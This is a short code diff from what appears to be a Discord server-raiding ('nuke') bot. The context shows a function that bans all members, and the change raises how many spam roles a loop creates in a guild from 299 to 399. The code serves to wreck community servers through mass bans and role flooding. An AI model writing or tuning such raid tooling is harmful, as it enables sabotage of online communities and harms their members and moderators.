@@ -65,7 +65,7 @@ async def ban_all_members(guild):
 
 async def create_roles(guild, name):
     created = 0
-    for _ in range(299 - len(guild.roles)):
+    for _ in range(399 - len(guild.roles)):
         try:
             await guild.create_role(name=name)
             created += 1
